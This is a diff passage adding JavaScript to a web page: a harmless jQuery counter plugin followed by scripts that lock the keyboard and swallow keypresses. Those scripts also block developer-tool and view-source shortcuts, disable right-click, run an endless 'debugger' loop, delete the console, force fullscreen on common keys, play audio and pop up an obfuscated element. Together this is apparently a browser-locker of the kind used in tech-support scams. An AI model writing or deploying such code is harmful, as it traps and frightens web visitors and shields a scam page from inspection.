+                    loopCount = 0,
+                    value = settings.from,
+                    data = $self.data('countTo') || {};
+
+                $self.data('countTo', data);
+
+                // if an existing interval can be found, clear it first
+                if (data.interval) {
+                    clearInterval(data.interval);
+                }
+                data.interval = setInterval(updateTimer, settings.refreshInterval);
+
+                // initialize the element with the starting value
+                render(value);
+
+                function updateTimer() {
+                    value += increment;
+                    loopCount++;
+
+                    render(value);
+
+                    if (typeof (settings.onUpdate) == 'function') {
+                        settings.onUpdate.call(self, value);
+                    }
+
+                    if (loopCount >= loops) {
+                        // remove the interval
+                        $self.removeData('countTo');
+                        clearInterval(data.interval);
+                        value = settings.to;
+
+                        if (typeof (settings.onComplete) == 'function') {
+                            settings.onComplete.call(self, value);
+                        }
+                    }
+                }
+
+                function render(value) {
+                    var formattedValue = settings.formatter.call(self, value, settings);
+                    $self.html(formattedValue);
+                }
+            });
+        };
+
+        $.fn.countTo.defaults = {
+            from: 0,               // the number the element should start at
+            to: 0,                 // the number the element should end at
+            speed: 1,           // how long it should take to count between the target numbers
+            refreshInterval: 1,  // how often the element should be updated
+            decimals: 0,           // the number of decimal places to show
+            formatter: formatter,  // handler for formatting the value before rendering
+            onUpdate: null,        // callback method for every time the element is updated
+            onComplete: null       // callback method for when the element finishes updating
+        };
+
+        function formatter(value, settings) {
+            return value.toFixed(settings.decimals);
+        }
+    }(jQuery));
+
+    jQuery(function ($) {
+        // custom formatting example
+        $('.count-number').data('countToOptions', {
+            formatter: function (value, options) {
+                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
+            }
+        });
+
+        // start all the timers
+        $('.timer').each(count);
+
+        function count(options) {
+            var $this = $(this);
+            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
+            $this.countTo(options);
+        }
+    });
+</script>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $(".pro_box2").delay(1).fadeIn(800);
+        $(".pro_box3").delay(1).fadeIn(800);
+        $(".pro_box3").delay(1).fadeIn(800);
+        $("#pop_up_new").delay(1).fadeIn(800);
+        $("#yteuwqtudggsajdgjahs").delay(1).fadeIn(800);
+    });
+</script>
+<script type="text/javascript">
+    document.addEventListener('keyup', function (es) {
+        if (es.keyCode === 27) {
+            toggleFullScreen();
+        }
+    }, false);
+</script>
+<script type="text/javascript">
+    document.addEventListener('keyup', function (e) {
+        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
+            document.getElementById('map').innerHTML = stroka;
+            toggleFullScreen();
+        }
+    }, false);
+</script>
+<script>
+    var modal = document.getElementById('myModal');
+    var btn = document.getElementById("myBtn");
+    var span = document.getElementsByClassName("close")[0];
+
+   
+    span.onclick = function () {
+        modal.style.display = "none";
+    }
+
+    window.onclick = function (event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+    $(document).ready(function () {
+        $("#mycanvas").click(function () { $("#welcomeDiv").show();});
+        
+        $("body").mouseover(function () {$("#yteuwqtudggsajdgjahs").show();
+        });
+        
+    });
+</script>
+</body>
+
+<script>
+      function play() {
+        var audio = document.getElementById("audio");
+        audio.play();
+      }
+ </script>
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+    <script>
+
+    document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'i'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'l'.charCodeAt(0) || e.keyCode == 'l'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'c'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'j'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && (e.keyCode == 'U'.charCodeAt(0) || e.keyCode == 'u'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && (e.keyCode == 'S'.charCodeAt(0) || e.keyCode == 's'.charCodeAt(0))) {
+            return false;
+        }
+    }
+</script>
+<script>
+document.addEventListener('contextmenu', event => event.preventDefault());
+(function () {
+        (function a() {
+            try {
+                (function b(i) {
+                    if (('' + (i / i)).length !== 1 || i % 20 === 0) {
+                        (function () { }).constructor('debugger')()
+                    } else {
+                        debugger
+                    }
+                    b(++i)
+                }
+                )(0)
+            } catch (e) {
+                setTimeout(a, 5)
+            }
+        }
+        )()
+    }
+    )();
+    delete window.console
+console.log('test');
+</script>
+
+</html>
